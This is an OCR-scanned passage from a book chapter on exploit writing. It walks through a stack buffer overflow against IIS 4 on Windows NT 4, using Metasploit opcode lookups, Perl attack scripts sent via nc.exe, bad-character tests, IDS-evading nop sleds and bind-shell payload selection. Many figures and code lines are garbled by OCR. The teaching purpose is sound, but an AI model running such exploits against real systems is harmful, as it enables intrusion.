enced by EIR. We also know that if a debugger is attached to the process, it will catch 
the exception. This will allow us to examine the state of the process, including the reg-
ister values at the time of the access violation, immediately after the return address is 
popped into EIR 
Co incidentally, this exact process state was captured during the offset calculation 
stage. Looking at the register window in Figure 12.13 shows us that the registers EAX 
and ESI point to locations within our attack string. Now we have two potential loca-
tions where EIP can land. 
To pinpoint the exact location where the registers point in the attack string, we 
again look back to Figure 12.13. In addition to displaying the value of the registers, the 
debugger also displays the data pointed to by the registers. EAX points to the string 
starting with "7At8", and ESI points to the string starting with "At5A". Utilizing the 
patternOfrset.pl tool once more, we find that EAX and ESI point to offsets in the attack 
string at 593 bytes and 585 bytes, respectively. 
Examining Figure 12.18 reveals that the location pointed to by ESI contains only 
four bytes of free space whereas EAX points to a location that may contain as many as 
3407 bytes of shellcode. 
Figure 12.18 EAX and ESI Register Values 
589 bytes of pattern 
4 byles overwriting saved 
return address 
ESI points lo 
the 585" byte. 
FS 
3407 bytes for payload 
EAX points to 
the 593'° byte. 
EAX 
We select EAX as the pointer to the location where we want EIR to land. Now we 
must find the address of a CALL EAX instruction, within a DLL's memory space, which 
will copy the value in EAX into EIR. 
NOTE 
If EAX did not point to the attack string, it may seem impossible to use ESI and 
fit the payload into only four bytes. However, more room for the payload can 
be obtained by inserting a JMP SHORT 6 assembly instruction (OxEB06) at the 
offset 585 bytes into the attack string. When the processor bounces off ESI and 
lands at this instruction, the process will jump forward six bytes over the saved 
return address and right into the swath of free space at offset 593 of the attack 

Writing Exploits III • Chapter 12 
509 
string. The remainder of the exploit would then follow as if EAX pointed to the 
attack string all along. For those looking up x86 opcodes, note that the jump is 
only six bytes because the JMP opcode (0xEB06) is not included as part of the 
distance. 
An excellent x86 instruction reference is available from the NASM project at 
http://nasm.sourceforge.net/doc/html/nasmdocb.html. 
Finding a Return Address 
When returning directly to the stack, finding a return address simply involves examining 
the debugger's stack window when HIP is overwritten in order to find a stack address 
that is suitable for use.Things become more complicated with the example because DLL 
bouncing is the preferred control vector. First, the instruction to be executed is selected. 
Second, the opcodes for the instruction are determined. Next, we ascertain which DLLs 
are loaded by the target application. Finally, we search for the specific opcodes through 
the memory regions mapped to the DLLs that are loaded by the application. 
Alternatively, we can look up a valid return address from the point-and-click Web 
interface provided by Metasploit's Opcode Database located at www.metasploit.com (see 
Figure 12.19).The Metasploit Opcode Database contains over 7,5 million precalculated 
memory addresses for nearly 250 opcode types, and continues to add more and more 
return addresses with every release-
Figure 1 2 . 1 9 Selecting the Search Method in the Metasploit Opcode Database 
The Metasploit Opcode Database 
Welcome to the Metasplort Opcode Database. Pic as a click on die option you 
would like to perform: 
Searcri the database 
* Search far opcodes in a set of module^ 
* Search for opcodes usir>q windbq's \iil of modules 
Show database content* 
+ Display supported opcoda types 
* Display Supported oper-jtin-7. : y ; ? e m ; 
* 
[•'=•• f ' ^ y •-"; F " W * < ! r-i 
. ] i ] ' ^ 
* Display rrnd'.lp i-i»rirn-avrin 
D <• 
11 •> • 
••' 
' ! i 
" ! • i 
Last database update: 2005-01-G9 16:31 
Number of opcodes: 749-5.374 
Number of opted* b/pni 248 
Number of operating srsterns^ 23 
Number of architectures: 1 
Number of moduIff: 1369* 
Number of module segments; 56133 
Number of module imports: 1S03966 
Number of module exports: 562273 
Using the return address requirements in our example, we will walk through the 
usage of the Metasploit Opcode Database. 

510 
Chapter 12 * Writing Exploits III 
As seen in Figure 12.20, the Metasploit Opcode Database allows a user to search 
two ways. The standard method is to select the DLLs that the target process loads from a 
listbox. The alternative method allows a user to cut and paste the library listing provided 
by Win Dbg in the command window when the debugger attaches. 
For instructive reasons, we will use the first method. 
In step one, the database allows a user to search by opcode class, meta-type, or specific 
instruction.The opcode class search will find any instruction that brings about a selected 
effect; in Figure 12.20, the search would return any instruction that moves the value in 
EAX into EIF.The meta-type search will find any instruction that follows a certain opcode 
pattern; in Figure 12.20, the search would return any call instruction to any register. 
Finally, the specific opcode search will find the exact instruction specified; in Figure 
12.20, the search would return any instances of the CALL EAX opcode, OxFFDO. 
Figure 12.20 Step One: Specifying the Opcode Type 
Searching opcodes 
Select opcode types 
Please select the class. metar Or sp 
C 
Opcode C l » f 
| e s x - > e i p 
2} 
C Opcode Meto Type 
| pop/pop/'et 
^i 
ts Specific opcode 
| call eex 
j 
C if IC opcode that you 
l o f 4 
wish to search; 
Cancel | 
Next | 
Because our control vector passes through the EAX register, we will use the CALL 
EAX instruction to pass control. 
In the second step of the search process, a user specifies the DLLs to be used in the 
database lookup.The database can search all of the modules, one or more of the com-
monly loaded modules, or a specific set of modules. In our example, we choose ntdll.dll 
and kernel32.dll because we know that the inetinfo.exe process loads both libraries at 
startup (see Figure 12.21). 
Figure 12.21 Step Two: Choosing DLLs 
Searching opcodes 
2 of 4 
•loot on* or man im*os rile modules to s»*rco from: 
f ftnr •••l-'ii" III'' ll'Hir|i||i-
•r? Seltct one or mmrm common module* 
md&di 
thell32dll 
rjditfCl 
ws2_12 all 
wsZhelpdll 2. 
C Supply * cuttom lt*t of module* 
fa.*). ,i#j'rt#tt£..jWA(dW.<ffrj 
Cincel J b*tft I Wort 

Writing Exploits III • Chapter 12 
511 
A 
NOTE 
Many exploits favor the use of ntdll.dll and kernel32.dll as a trampoline for a 
number of reasons. 
1. Since Windows NT 4, every process has been required to load ntdll.dll 
into its address space, 
2. Kernel32.dll must be present in all Win32-based applications. 
3. If ntdll.dll and kernel32.dll are not loaded to their preferred base 
address, then the system will throw a hard error. 
By using these two libraries in our example, we significantly improve the 
chances that our return address corresponds to our desired opcodes. 
Due to new features, security patches, and upgrades, a DLL may change with every 
patch, service pack, or version of Windows, In order to reliably exploit the target host, 
step 3 allows a user to control the search of the libraries to one or more Windows ver-
sions and service pack levels.The target host in our example is Windows NT 4 with 
Service Pack 5 installed (see Figure 12.22). 
Figure 12.22 Step Three: Selecting the Target Platform 
Searching opcodes 
3 of 4 
s r l r d operating t u r r i t 
Spaeifr tne operating srsterr. versions that should be searched on: 
•" 
Any operating system versions 
• i 
Snrcitic ape-rating system vernon(s) 
Wndows NT 4 0 0 010 SPO (W2) 
H 
Windows NT 40 1 0 4 0 SP1 |IA37) 
Windows NT 4 0 E.O 1 0 SP2 (W2) 
Windows NT 40 3 G 4 0 SP3 (WJ) 
Wnduws NT 4 0 40 4.0 SP4 flA3a) 
• I 
'i'leMMIIIhllHIHf 
Wndows NT 4 0 S 0 4 0 SP6 [U\32] 
WndowsNT 351 00 3 51 SP0(1A32) 
j 
P Matcnes should (pen more than one OS 
Cancel | 
tact 1 
H;ii | 
In a matter of seconds, the database returns eight matches for the CALL EAX 
instruction in either ntdll.dll or kernel32.dll on Windows NT 4 Service Pack 5 (see 
Figure 12,23). Each row in the results consists of four fields: address, opcode, module, 
and OS versions. Opcode contains the instruction that was found at the corresponding 
memory location in the address column.The Module and OS Versions fields provide 
additional information about tht- opcode that can be used for targeting. For our exploit, 
only one address is needed to overwrite the saved return address. All things being equal, 
we will use the CALL EAX opcode found in ntdll.dll at memory address 0x77F763H5, 
In addition to the massive collection of instructions in the opcode database, 
Metasploit provides two command-line tools, msfpescan and msfelfscan, that can be used 
to search for opcodes in portable executable (PE) and executable and linking format 
(ELF) files, respectively. PE is the binary format used by Windows systems, and ELF is 

512 
Chapter 12 * Writing Exploits III 
the most common binary format used by UNIX systems. When scanning manually, it is 
important to use a DLL from the same platform you are trying to exploit. In Figure 
12.24, we use msfpescan to search for jump equivalent instructions from the ntdll.dll 
shared library found on our target. 
Figure 1 2 . 2 3 Step Four: Interpreting the Results 
Searching opcodes 
EttecuLInc » care hi QpcraTmn... 
A lotil of 3 matehej wore found: 
oodreu 
is 
I. 
Module 
0x77(la9*d 
call flax LumrU? dll 
(4.0.0-0) 
Ox77(le0ef 
call eax 
liem»tw.rtl 
(4.0.0.0) 
0x77fle!bc 
celleex tenilUZM 
(4.0-0-0) 
0x77*10489 call eax 
kflmcl32.dll 
&0AA) 
Ox77f3»lb call eax 
kttTiell^.dli 
0x77IJ63oS call eax hHII-dll 
(4.0.0.0) 
Ox77f«d75 
call eax rthlll.dll 
(4.0.0.0) 
Ox77f?odee call eax rifdlMII 
(J .0.0.0) 
-ion 
as VerciDiK 
WindDm HT 4.0.5.0 4.0 SP5 tf A32) 
Window* HT 4.0.5.0 4.0 SP5 UA32) 
Wmdowi HT 4.0.5.0 4.0 SP5 (3A32) 
Windowi HT 4.0.5.0 4.0 SP5 (1A32) 
Window i HT 4.0.5.0 4.0 £P5 (]Ai2) 
Wmdom MT 4.0.5.0 4.0 5PB(|A») 
Windows HT 4.0.5.0 4.0 SP5 (IAS] 
Widows HT 4.0.5,0 4.0 SP5 (1A32) 
Con«l I 
BaA | 
rirwth | 
Figure 1 2 . 2 4 Using msfpescan 
' 
t 
.^nafpescan 
-h 
Usage: 
./n;fpcacan < input > <Mad*> <option&> 
Inputa: 
-f 
r , L- • 
Read in n 
f i l e 
-d 
<dir> 
Process nendunp output 
lodes: 
i t.i 
1 ' H I I - 
r 
.» 
I 
:S 
? 
n 
<ro*j> 
<rngox? 
-Ciitliirrr:! •• 
i ..|mi 
•'.i.-.n.-il . 
n d d r c s a 
•, 
./nal pescan -f NT DLL 
^ r ^ F r f r ? b d 
|lU3h e * K 
lx77F7n3S5 
c a l l eax 
Jx?7f94d7S 
c a l l eax 
dx77f?4dco 
c a l l eax 
. _ 
Searcb Far junp euuiviilanl 
instructions 
Scare li f a r pop * pap* rut canbinitt ion a 
Search f a r re^ex natch 
Sht"J code. *t specified v i r t u a l "ddfeic 
Display d e t a i l e d PF Infarnation. 
Hunbcj' of hvtes to shot* a f t e r natch 
HunNer of bytes to shew before natch 
Specify am a l t e r n a t e InagcBasc 
Print disassembly of natctad data 
i r u w a rh 
, DLL -J *ax 
' i-««eu«*rk 
— lal JCI 
J 
-
NOTE_ 
ne 
Tal 
Software is always being upgraded and changed. As a result, the offset for a vul-
nerability in one version of an application may be different in another version. 
Take IIS 4, for example. We know so far that the offset to the return address is 
589 bytes in Service Pack 5. However, further testing shows that Service Packs 3 
and 4 require 593 bytes to be sent before the return address can be overwritten. 
What this means is that when developing an exploit, there may be variations 
between versions, so it is important to find the right offsets for each. 

Writing Exploits III • Chapter12 
513 
As mentioned earlier, the shared library files may also change between oper-
ating system versions or service pack levels. However, it is sometimes possible to 
find a return address that is located in the same memory locations across dif-
ferent versions or service packs. In rare cases, a return address may exist in a 
DLL that works across all Windows versions and service pack levels. This is called 
a universal return address. For an example of an exploit with a universal return 
address, take a closer look at the Seattle Lab Mail 5.5 POP3 Buffer Overflow 
included in the Metasploit Framework. 
Using the Return Address 
The exploit can now be updated to overwrite the saved return address with the address 
of the CALL EAX instruction that was found, 0x77F7d3H5.The saved return address is 
overwritten by the 590'h to 593"1 bytes in the attack string, so in Example 12.4 the 
exploit is modified to send the new return address at bytes 590 and 593. 
" " * » " Example 12.4 Inserting the Return Address 
mmm 
1 
Sstring 
2 Sstring .= "\xcc" x 589; 
3 Sstring .= "\x85\x63\x£7\x'77-; 
4 $string .= -\xce- x 500? 
5 Sstring .=".htr HTTP/1.0Vr\n\r\n"; 
6 
7 openINC, "|nc.exe 192.168.119.136 80"); 
8 print NC Sstring; 
9 close(NC); 
Line 1 and line 5 prefix and postfix the attack string with the HTTP protocol and 
file extension requirements. Line 3 overwrites the saved return address with the address 
of our CALL EAX instruction. Because the target host runs on an x8fS architecture, the 
address must be represented in little-endian format. Lines 2 and 4 are interesting because 
they pad the attack string with the byte OxCC. Lines 7 through 9 handle the sockets. 
An xS6 processor interprets the OxCC byte as the INT3 opcode, a debugging 
instruction that causes the processor to halt the process for any attached debuggers. By 
filling the attack string with the INT3 opcode, we are assured that if Ell' lands anywhere 
on the attack string, the debugger will halt the process.This allows us to verify that our 
return address worked. With the process halted, the debugger can also be used to deter-
mine the exact location where E1P landed, as seen in Figure 12.25. 
Figure 12.25 is divided into four window areas (clockwise from the upper left): 
opcode disassembly, register values, stack window, and memory window.The disassembly 
shows how the processor interprets the bytes into instructions, and we can see that EIP 
points to a series of INT3 instructions.The register window displays the current value of 
the registers. EIP points to the next instruction, located at (lx()OF0FC71), so the current 
instruction must be located at 0x(K)FOFC7C. Examining the memory window confirms 
that 0x00F0FC7C is the address of the first byte after the return address, so the return 
address worked flawlessly and copied EAX into EIP. 

514 
Chapter 12 * Writing Exploits III 
Figure 12.25 Verifying Return Address Reliability 
B0F8FCS8 
eeFBFC«3 
BBFBFC«4 
BBFBFCS5 
B8FBFCS6 
BWBFC37 
BBFeFCSS 
eeFeFces 
8BFBFC8S 
aeFeFcsB 
eefeFCsc 
>
•
•
-
-
•
•
-
' 
- • : : 
:ni: 
IMTC 
[NTS 
INT3 
I ma 
i ma 
i ma 
[ m ; 
[HT; 
[HT3 
|MT; 
:m-
INTS 
INT3 
Pojdr«*i IHt* dure 
O0F0FC4C 
9«F8FCS4 
BBFaFCSC 
aeF0FM4 
eeFeFcst 
BBF9FC74 
BBFeFCTt 
C'C'FO-CSJ 
BBFeFcat 
B«F0FC^4 
OBFBFC* 
OOFeFCM 
nnFnsTfli; 
MFCFC84 
MFSFCSt 
41 41 41 
41 41 41 
41 41 4 ! 
41 41 41 
41 41 41 
41 41 41 
41 41 41 
41 41 41 
cc cc cc 
CC CC CC 
cc cc cc 
cc cc cc 
cc tx cc 
cc cc cc 
cc cc cc 
cc cc cc 
cc cc cc 
T rr rr 
41 41 
41 41 
41 41 
41 41 
41 41 
41 41 41 
41 41 41 
41 4: 41 
41 41 41 
41 41 41 
41 41 41 41 
41 41 
4: :C 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc rr 
41 41 41 
S3 F7 77 
CC CC CC 
CC CC CC 
cc cc cc 
cc cc cc 
cc cc cc 
cc cc cc 
cc cc cc 
cc cc cc 
cc cc cc 
1 
I 
U II 
I'lrirlf'Hflflf 
.•I Registers 1FFU1 
J0FOF . 
ECX 77F76385 r i l d l L. 77F763£S 
EDX 77F9647P. flltjl 1.77F9667fl 
EBX MFOFSEB 
ESP eaFOFSie 
EBP BBFOFB3C 
E41 eaF9FC74 
EDI eeeeeeoe 
EIP eaF9FC7D 
il B 
F : 
i; a 
l I 
; a 
r e 
: a 
c e 
ES 9823 32bit BIFFFFFFFF) 
CS 9B1B 32bit BIFFFFFFFF) 
ss aeza 3&>it BIFFFFFFFFI 
OS 9323 32b it BIFFFFFFFFI 
FS 9B3B 32bit 7FFD7BeB<FFF) 
ss aoee NULL 
L i l t Err ERROFt_FILEN»1E_EXCED_FWh»GE 
eaeee24« <MO. NB.E.BE.HS,PE.SE.LEI 
ocrcFc;;: 
B9FBFS2C 
aaFapsae 
BBF0Fe34 
BBF0F838 
8BF8FB3£ 
,-»-:.-• = .: 4.1 
MF8FB44 
BeF«f94B 
BBF8FB4C 
BBFBFBEe 
B9F9FBS4 
eBF0F958 
oeFefesc 
Mrorege 
BBFBFC74 
enrnreFC 
B8FBF3C4 
ecrorc74 
77F96S7B 
B6F8FC74 
aeFeFEce 
77F8912FJ 
C-OFSJCEEi? 
98FBFC74 
BBFBF8FC 
9«FBF3C4 
77F7S3B5 
9SFBFE7S 
Pointer to n*Ht SEH r*oord 
SE Nwidltr 
RETURN to ntdll.77F6S12E froi 
ntdll,77F76385 
^li 
Instead of executing INT3 instruction, we would like the processor to execute a 
payload of our choosing, but first wc must discover the pay load's limitations. 
Determining Bad Characters 
Many applications perform filtering on the input that they receive, so before sending a 
payload to a target, it is important to determine if there are any characters that will be 
removed or cause the payload to be tweaked. There are two generic ways to determine if 
a payload will pass through the filters on the remote system. 
The first method is to simply send over a payload and see if it is executed. If the 
payload executes, then we are finished. Howrever, this is normally not the case, so the 
remaining technique is used. 
First, we know that all possible ASCII characters can be represented by values from 
0 to 255.Therefore, a test string can be created that contains all these values sequentially. 
Second, this test string can be repeated in the free space around the attack string's return 
address while the return address is overwritten with an invalid memory address. After the 
return address is popped into EIP, the process will halt on an access violation; now the 
debugger can be used to examine the attack string in memory to see which characters 
were filtered and which characters caused early termination of the string. 
If a character is filtered in the middle of the string, then it must be avoided in the 
payload. If the string is truncated early, then the character after the last character visible 
is the one that caused early termination.This character must also be avoided in the pay-
load. One value that virtually always truncates a string is 0x00 (the NULL character). A 
bad character test string usually does not include this byte at all. If a character prema-
turely terminates the test string, then it must be removed and the bad character string 
must be sent over again until all the bad characters are found. 

Writing Exploits III • Chapter12 
515 
When the test string is sent to the target, it is often repeated a number of times 
because it is possible for the program code, not a filter, to call a function that modifies 
data on the stack. Since this function is called before the process is halted, it is impossible 
to tell if a filter or function modified the test string. By repeating the test string, we can 
tell if the character was modified by a filter or a function because the likelihood of a 
function modifying the same character in multiple locations is very low. 
One way of speeding up this process is to simply make assumptions about the target 
application. In our example, the attack vector, a URL, is a long string terminated by the 
NULL character. Because a URL can contain letters and numbers, we know at a min-
imum that alphanumeric characters are allowed. Our experience also tells us that the 
characters in the return address are not mangled, so the bytes 0x77, 0xF7, 0x63, and 
0x85 must also be permitted. The OxCC byte is also permitted. If the payload can be 
written using alphanumeric characters, 0x77, 0xF7, 0x63, 0x85, and OxCC, then we can 
assume that our payload will pass through any filtering with greater probability. 
Figure 12.26 depicts a sample bad character test string. 
Figure 12.26 Bad Character Test String 
ASCII chars \x01 to \xFF 
Invalid memory address 
overwriting the saved 
return address 
ASCII chars \x01 to\xFF 
Determining Space Limitations 
Now that the bad characters have been determined, we must calculate the amount of 
space available. More space means more code, and more code means that a wider selec-
tion of payloads can be executed. 
The easiest way to determine the amount of space available in the attack string is to 
send over as much data as possible until the string is truncated. In Example 12.5 we 
already know that 589 bytes are available to us before the return address, but we are not 
sure how many bytes are available after the return address. In order to see how much 
space is available after the return address, the exploit script is modified to append more 
data after the return address. 
l l j l l l l i Example 12.5 Determining Available Space 
••••1111 
i 
53 t ri ng = -GET / • ; 
2 
Sstring .= "\xcc" x 539; 
3 
Sstring .= •\x8S\x63\xf7\x77'; 
4 
$string .= "\xce" x 10D0; 
5 Sstring .='.htr HTTP/1.0\r\n\r\n"; 
6 
7 openlNC, "|nc.exe 192.168.119.136 80"); 
8 print NC Sstring; 
9 
close(NC); 
Line 1 and line 5 prefix and postfix the attack string with the HTTP protocol and file 
extension requirements. Line 2 pads the attack string with 589 bytes of the OxCC char-

516 
Chapter 12 * Writing Exploits III 
acter. Line 3 overwrites the saved return address with the address of our CALL EAX 
instruction. Line 4 appends 1000 bytes of the OxCC character to the end of the attack 
string. When the processor hits the OxCC opcode direedy following the return address, the 
process should halt, and we can calculate the amount of space available for the payload. 
When appending large buffers to the attack string, it is possible to send too much 
data. When too much data is sent, it will trigger an exception, which gets handled by 
exception handlers. An exception handler will redirect control of the process away from 
our return address, and make it more difficult to determine how much space is available. 
A scan through the memory before the return address confirms that the 589 bytes 
of free space is filled with the OxCC byte. The memory after the return address begins at 
the address OxOOFOFCCC and continues until the address OxOOFOFFFF, as seen in Figure 
12.27. It appears that the payload simply terminates after OxOOfOfrfF, and any attempts to 
access memory past this point will cause the debugger to return the message that there is 
no memory on the specified address. 
Figure 12.27 The End of the Attack String 
Address |Hen dunp 
WJFttFEOF 
0OF0FEEF 
CiOFOFEFF 
0BF0FF0F 
06F0FRF 
00F0FF2F 
B8FBFF3F 
0OF0FF4F 
0C1F0FF5F 
9BF8FF6F 
0BF0FF7F 
BBFBFFSr 
00F0FF9F 
MFBFFAF 
0BF0FFEF 
eeFGFFCF 
0C1F0FFDF 
L".'[ Of 1 LF 
•MFiJFFFF 
c: cc CI: 
o: cc cc 
cc cc cc 
cc cc cc 
cc cc cc 
cc cc cc 
cc cc cc 
cc cc cc 
cc cc cc 
cc cc cc 
cc cc cc 
cc cc cc 
cc cc cc 
cc cc cc 
cc cc cc 
cc cc cc 
cc cc cc 
cc cc cc 
cc cc cc 
cc cc cc 
cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cTcT 
cc cc 
•:•: cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
ccrr 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
ccTF 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cTTc-
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
CC CC 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cTcc" 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
cc cc 
| recti 
IFIFIFIFFIFIFIFIFIFIFIFIr 
IrlrlFIFIFIFIrlF IFIF 1? Irlr 
l-IFIFIFFIFIFIFIFIFIFIFIF 
1F Irlr Irlr INPIflFIr If IPI? 
Irlrlrlflrlrlrlrlrlrlrlrlr 
1FIPI r IFIF IrlPlrlflr If Irlr 
Iflr If Irlr IF Irlr Irlr If Irlr 
IF IPI r Irlr If IPI? Iflr If IFI? 
IFIrlflrlrlFlrlflFlrrrlrlf 
HFIflFflflFIFIflrlflPlr 
IFIFIFIFFIflFlrlFlrlflflr 
Irlrlrlrirlflrlrlrlrlrlrlr 
1F IPI r IFIF IFIPIf IFIF IF IFIF 
Irlrlrlflrlrlrlrlrlrlrlrlr 
IFIPIFIFIrlrlPlrlrlrlflFlr 
Irlrlrlfflrlrlrlrlrlrlrlr 
IFIFIrlFIFIFIFIPIFIFrflFIr 
Irlrlrlflrlrlrlrlrlrlrlrlr 
I'IFIFIFFIFIrlrlFlrlflFIr 
Iflrlr Irlr IF Irlr Irlr IF Irlr 
-,rlr 
-fir 
rlrlr 
-irlf 
rlrlr 
-,flr 
•Irlr 
•irlr 
rlrlr 
rlrlr 
-irlr 
•Irlr 
-irlr 
rlrlr 
-Irlr 
•rlr 
-Irlr 
•.rlr 
-.rlr 
•irlr 
The memory ended at OxOOFOFFFF because the end of the page was reached, and the 
memory starting at OxOOF 10000 is unallocated. However, the space between 
OxOOFOFCCC and OxOOFOFFFF is filled with the OxCC byte, which means that we have 
820 bytes of free space for a payload in addition to the 589 bytes preceding the return 
address. If needed, we can use the jump technique described in "space trickery" to com-
bine the two free space locations resulting in 1409 bytes of free space. Most any payload 
can fit into the 1409 bytes of space represented in the attack string shown in Figure 12.28. 
Figure 12.28 Attack String Free Space 
589 bytes of free space 
4 bytes overwriting saved 
return address 
820 bytes of free space 

Writing Exploits III • Chapter 12 
517 
Nop Sleds 
EIP must land exactly on the first instruction of a payload in order for it to execute cor-
rectly. Because it is difficult to predict the exact stack address of the payload between 
systems.it is common practice to prefix the payload with a no operation (nop) sled. A 
nop sled is a series of nop instructions that allow EIP to slide down to the payload 
regardless of where EIP lands on the sled. By using a nop sled, an exploit increases the 
probability of successful exploitation because it extends the area where EIP can land 
while also maintaining the process state. 
Preserving process state is important because we want the same preconditions to be 
true before our payload executes no matter where EIP lands. Process state preservation 
can be accomplished by the nop instruction because the nop instruction tells the process 
to perform no operation.The processor simply wastes a cycle and moves on to the next 
instruction, and other than incrementing EIP, this instruction does not modify the state 
of the process. 
Figure 12.29 shows how a nop sled increases the landing area for EIP 
Figure 12.29 Increasing Reliability with a Nop Sled 
nop sled 
EIP can land at any 
address covered by the 
nop sled and the payload 
will execute. 
payload 
Every CPU has one or more opcodes that can be used as no-op instructions. The x86 
CPU has the "nop" opcode, which maps to 0x90, while some RISC platforms simply use 
an add instruction that discards the result. To extend the landing area on an x86 target, a 
payload could be prepended with a series of 0x90 bytes.Technically speaking, 0x90 repre-
sents the XCHG EAX, EAX instruction which exchanges the value of the EAX register 
with the value in the EAX register, thus maintaining the state of the process. 
For the purposes of exploitation, any instruction can be a nop instruction so long as it 
does not modify the process state that is required by the payload and it does not prevent 
EIP from eventually reaching the first instruction of the payload. For example, if the pay-
load relied on the EAX register value and nothing else, then any instruction that did not 
modify' EAX could be used as a nop instruction.The EBX register could be incremented; 
ESP could be changed; the ECX register could be set to 0, and so on. Knowing this, we 
can use other opcodes besides 0x90 to increase the entropy of our nop sleds. Because most 
IDS devices will look for a series of 0x90 bytes or other common nop bytes in passing 
traffic, using highly entropic, dynamically generated nop sleds makes an exploit much less 
likely to be detected. 
Determining the different opcodes that are compatible with both our payload and 
bad characters can be a tremendously time-consuming process. Fortunately, based on the 

518 
Chapter 12 * Writing Exploits III 
exploit parameters, the Metasploit Framework's six nop generators can create millions of 
nop sled permutations, making exploit detection via nop signatures practically impos-
sible. Although these generators are only available to exploits built into the framework, 
they 'will still be covered for the sake of completeness. 
The Alpha, MIPS, PPC, ami SPARC" generators produce nop sleds tor their respec 
tive architectures. On the x86 architecture, exploit developers have the choice of using 
Pex or OptyNop2.The Pex generator creates a mixture of single-byte nop instructions, 
and the OptyNop2 generator produces a variety of instructions that range from one to 
six bytes. Consider for a moment one of the key features of nop sleds: they allow' EIP to 
land at any byte on the sled and continue execution until reaching the payload.This is 
not an issue with single-byte instructions because EIP will always land at the beginning 
of an instruction. However, multibyte instruction nop sleds must be designed so that EIP 
can also land anywhere in the middle of a series of bytes, and the processor will con-
tinue executing the nop sled until it reaches the payload.The OptyNop2 generator will 
create a series of bytes such that EIP can land at any location, even in the middle of an 
instruction, and the bytes will be interpreted into functional assembly that always leads 
to the payload. Without a doubt, OptyNop2 is one of the most advanced nop generators 
available today. 
While nop sleds are often used in conjunction with the direct stack return control 
vector because of the variability of predicting an exact stack return address, they gener-
ally do not increase reliability when used with the shared library technique. Regardless, 
an exploit using a shared library trampoline can still take advantage of nops by random-
izing any free space that isn't being occupied by the payload. In our example, we intend 
on using the space after the return address to store our payload. Although we do not, we 
could use the nop generator to randomize the 589 bytes preceding the return address. 
This can be seen in Figure 12.30. 
Figure 12.30 Attack String with a Nop Sled 
589 bytes of nop sled 
4 bytes overwriting saved 
return address 
820 bytes of free space 
Choosing a Payload and Encoder 
The final stage of the exploit development process involves the creation and encoding of 
a payload that will be inserted into the attack string and sent to the target to be exe-
cuted. A payload consists of a succession of assembly instructions which achieve a spe-
cific result on the target host such as executing a command or opening a listening 
connection that returns a shell.To create a payload from scratch, an exploit developer 
needs to be able to program assembly for the target architecture as well as design the 
payload to be compatible with the target operating system.This requires an in-depth 
understanding of the system architecture in addition to knowledge of very low-level 
operating system internals. Moreover, the payload cannot contain any of the bad charac-
ters that are mangled or filtered by the application. While the task of custom coding a 

Writing Exploits III • Chapter 12 
519 
payload that is specific to a particular application running on a certain operating system 
above a target architecture may appeal to some, it is certainly not the fastest or easiest 
way to develop an exploit. 
To avoid the arduous task of writing custom sh elk ode for a specific vulnerability, we 
again turn to the Metasploit project. One of the most powerful features of the 
Metasploit Framework is its ability to automatically generate architecture and operating 
system—specific payloads that are then encoded to avoid application-filtered bad charac-
ters. In effect, the framework handles the entire payload creation and encoding process, 
leaving only the task of selecting a payload to the user. The latest release of the 
Metasploit Framework includes over 65 payloads that cover nine operating systems on 
four architectures. Too many payloads exist to discuss each one individually, but we will 
cover the major categories provided by the framework. 
Bind class payloads associate a local shell to a listening port. When a connection is 
made by a remote client to the listening port on the vulnerable machine, a local shell is 
returned to the remote client. Reverse shell payloads do the same as bind shell payloads 
except that the connection is initiated from the vulnerable target to the remote client. 
The execute class of payloads will carry out specified command strings on the vulner-
able target, and V N C payloads will create a graphical remote control connection 
between the vulnerable target and the remote client. The Meterpreter is a state-of-the-
art post exploitation system control mechanism that allows for modules to be dynami-
cally inserted and executed in the remote target's virtual memory. For more information 
about Meterpreter, check out the Meterpreter paper at www.nologin.com. 
The Metasploit project provides two interfaces to generate and encode payloads. The 
Web-interface found at www.metasploit.com/shellcode.html is the easiest to use, but there 
also exists a command-line version consisting of the tools nisfpayload and msfencode. We 
will begin our discussion by using the nisfpayload and msfencode tools to generate and 
encode a payload for our exploit and then use the Web interface to do the same. 
As shown in Figure 12.31, the first step in generating a payload with nisfpayload is 
to list all the payloads. 
The help system displays the command-line parameters in addition to the payloads 
in short and long name format. Because the target architecture is x86 and our operating 
system is Windows, our selection is limited to those payloads with the Win32 prefix. We 
decide on the win32_bind payload, which creates a listening port that returns a shell 
when connected to a remote client (see Figure 12.32).The next step is to determine the 
required payload variables by passing the S option along with the win32_biiui argument 
to nisfpayload.This displays the payload information. 
There are two required parameters, EXITFUNC and LPORT, which already have 
default values of seh and 4444, respectively.The EXITFUNC option determines how 
the payload should clean up after it finishes executing. Some vulnerabilities can be 
exploited again and again as long as the correct exit technique is applied. During testing, 
it may be worth noting how the different exit methods will affect the application. The 
LPORT variable designates the port that will be listening on the target for an incoming 
connection. 

520 
Chapter 12 * Writing Exploits III 
Figure 12.31 Listing Available Payloads 
US.A>IE r 
. /m. I pji v l n * d 
'Lp»ylD-*d> 
lv< 
F a u l a o d t i 
b i d 
i«32 b i n d 
bid 
1*32 h i n d s i * 
bld_lfllZ_BKflC 
b i d _ l « 3 2 _ f i n d r r c v 
b i d _ t a 3 2 _ f i n d r E c u _ m 
b i d _ i a 3 2 _ f i n d i n c k 
hi d _ ia 3 2 _reve r i i 
